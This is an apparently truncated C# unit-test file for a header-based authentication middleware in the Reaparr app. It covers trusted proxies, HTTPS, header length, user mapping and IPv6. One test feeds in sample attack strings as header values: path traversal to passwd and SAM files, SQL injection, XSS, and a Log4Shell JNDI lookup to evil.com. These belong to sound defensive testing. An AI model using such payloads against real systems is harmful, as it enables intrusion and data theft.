using System.Net;
using System.Security.Claims;
using Autofac;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Primitives;
using Reaparr.Identity.Contracts;
using Reaparr.Settings.Contracts;
using Serilog.Sinks.TestCorrelator;

namespace Reaparr.AppHost.UnitTests;

public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthenticationMiddleware>
{
    private const string TEST_HEADER_NAME = "X-Auth-User";
    private const string TEST_USERNAME = "testuser";
    private const string TEST_EMAIL = "test@example.com";
    private const string TEST_USER_ID = "test-user-id";

    public HeaderAuthenticationMiddlewareUnitTests(ITestOutputHelper output)
        : base(output) { }

    #region InvokeAsync - Early Exit Scenarios

    [Fact]
    public async Task ShouldCallNext_WhenHeaderNotPresent()
    {
        // Arrange
        var context = CreateHttpContext();
        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        SetupMocks();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldCallNext_WhenHeaderIsEmpty()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = "";
        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        SetupMocks();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldCallNext_WhenHeaderIsWhitespace()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = "   ";
        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        SetupMocks();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldCallNextAndLogWarning_WhenHeaderPresentButAuthenticationDisabled()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = false,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [],
            EnableLogging = true,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("Header authentication is disabled"));
    }

    [Fact]
    public async Task ShouldCallNext_WhenUserAlreadyAuthenticated()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.User = CreateAuthenticatedUser();
        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["127.0.0.1"],
            EnableLogging = true, // Enable logging for this test
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        SetupAuthenticationSettings(headerAuthSettings);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("User is already authenticated"));
    }

    #endregion

    #region Trusted Proxy Validation Tests

    [Theory]
    [InlineData("192.168.1.1", "192.168.1.1", true)]
    [InlineData("192.168.1.1", "192.168.1.2", false)]
    [InlineData("192.168.1.1", "192.168.1.0/24", true)]
    [InlineData("192.168.1.100", "192.168.1.0/24", true)]
    [InlineData("192.168.2.1", "192.168.1.0/24", false)]
    [InlineData("10.0.0.1", "10.0.0.0/8", true)]
    [InlineData("10.255.255.255", "10.0.0.0/8", true)]
    [InlineData("11.0.0.1", "10.0.0.0/8", false)]
    public async Task ShouldValidateTrustedProxy_WhenRequestFromDifferentIPs(
        string requestIp,
        string trustedProxy,
        bool shouldBeTrusted)
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse(requestIp);

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [trustedProxy],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        // Verify the expected behavior based on shouldBeTrusted
        if (shouldBeTrusted)
        {
            // Should attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        }
        else
        {
            // Should not attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(It.IsAny<string>()), Times.Never);
        }
    }

    [Fact]
    public async Task ShouldCallNextAndLogWarning_WhenRequestFromUntrustedProxy()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["10.0.0.0/8"],
            EnableLogging = true,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e =>
            e.MessageTemplate.Text.Contains("Request with header authentication token from untrusted IP"));
    }

    [Fact]
    public async Task ShouldCallNext_WhenNoTrustedProxiesConfigured()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldCallNext_WhenRemoteIpIsNull()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = null;

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        SetupMocks();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    #endregion

    #region HTTPS Requirement Tests

    [Fact]
    public async Task ShouldCallNextAndLogWarning_WhenHttpsRequiredButRequestNotSecure()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Request.IsHttps = false;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = true,
            MaxHeaderLength = 100,
            RequireHttps = true,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("Header authentication requires HTTPS"));
    }

    [Fact]
    public async Task ShouldProceed_WhenHttpsRequiredAndRequestIsSecure()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Request.IsHttps = true;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = true,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldProceed_WhenHttpsNotRequired()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Request.IsHttps = false;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    #endregion

    #region Header Length Validation Tests

    [Fact]
    public async Task ShouldCallNextAndLogWarning_WhenHeaderValueExceedsMaxLength()
    {
        // Arrange
        var context = CreateHttpContext();
        var longHeaderValue = new string('A', 300); // Exceeds default 256 limit
        context.Request.Headers[TEST_HEADER_NAME] = longHeaderValue;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = true,
            MaxHeaderLength = 256,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("Header value exceeds maximum length"));
    }

    [Fact]
    public async Task ShouldProceed_WhenHeaderValueWithinMaxLength()
    {
        // Arrange
        var context = CreateHttpContext();
        var validHeaderValue = new string('A', 100); // Within 256 limit
        context.Request.Headers[TEST_HEADER_NAME] = validHeaderValue;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 256,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(validHeaderValue)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldNotLogWarning_WhenHeaderValueExceedsMaxLengthButLoggingDisabled()
    {
        // Arrange
        var context = CreateHttpContext();
        var longHeaderValue = new string('A', 300);
        context.Request.Headers[TEST_HEADER_NAME] = longHeaderValue;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 256,
            RequireHttps = false,
        };
        headerAuthSettings.TrustedProxies = ["192.168.1.0/24"];

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldNotContain(e => e.MessageTemplate.Text.Contains("Header value exceeds maximum length"));
    }

    #endregion

    #region User Mapping Tests

    [Fact]
    public async Task ShouldCallNextAndLogWarning_WhenUserNotFoundByUsername()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = true,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("The wrong user is passed in"));
    }

    [Fact]
    public async Task ShouldCallNextAndLogWarning_WhenUserNotFoundByEmail()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_EMAIL;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Email,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = true,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByEmailAsync(TEST_EMAIL)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("The wrong user is passed in"));
    }

    [Fact]
    public async Task ShouldAuthenticateUser_WhenUserFoundByUsername()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = true,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = CreateTestUser();

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>().Setup(x => x.GetRolesAsync(testUser)).ReturnsAsync(["User"]);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("User authenticated via header"));
    }

    [Fact]
    public async Task ShouldAuthenticateUser_WhenUserFoundByEmail()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_EMAIL;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Email,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = true,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = CreateTestUser();

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByEmailAsync(TEST_EMAIL)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>().Setup(x => x.GetRolesAsync(testUser)).ReturnsAsync(["User"]);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("User authenticated via header"));
    }

    #endregion

    #region Security Edge Cases

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("../../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")]
    [InlineData("admin'; DROP TABLE users; --")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("${jndi:ldap://evil.com/exploit}")]
    [InlineData("'; eval('malicious_code'); //")]
    public async Task ShouldRejectMaliciousHeaderValues_WhenHeaderContainsSuspiciousContent(string maliciousValue)
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = maliciousValue;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(maliciousValue)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(maliciousValue), Times.Once);
    }

    [Fact]
    public async Task ShouldHandleVeryLongHeaderValue_WhenValueExceedsReasonableLimit()
    {
        // Arrange
        var context = CreateHttpContext();
        var veryLongValue = new string('A', 10000); // Very long value
        context.Request.Headers[TEST_HEADER_NAME] = veryLongValue;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 256,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldHandleNullHeaderValue_WhenHeaderValueIsNull()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = (string?)null;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        SetupMocks();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    #endregion

    #region IPv6 Address Tests

    [Theory]
    [InlineData("::1", "::1", true)]
    [InlineData("::1", "127.0.0.1", false)]
    [InlineData("2001:db8::1", "2001:db8::/32", true)]
    [InlineData("2001:db8::1", "2001:db8::/64", true)]
    [InlineData("2001:db8:1::1", "2001:db8::/32", true)]
    [InlineData("fe80::1", "fe80::/16", true)]
    public async Task ShouldHandleIPv6Addresses_WhenValidIPv6AddressesProvided(
        string requestIp,
        string trustedProxy,
        bool shouldBeTrusted)
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse(requestIp);

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [trustedProxy],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        // Verify the expected behavior based on shouldBeTrusted
        if (shouldBeTrusted)
        {
            // Should attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        }
        else
        {
            // Should not attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(It.IsAny<string>()), Times.Never);
        }
    }

    #endregion

    #region Claims Creation Tests

    [Fact]
    public async Task ShouldCreateCorrectClaims_WhenUserAuthenticatedSuccessfully()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
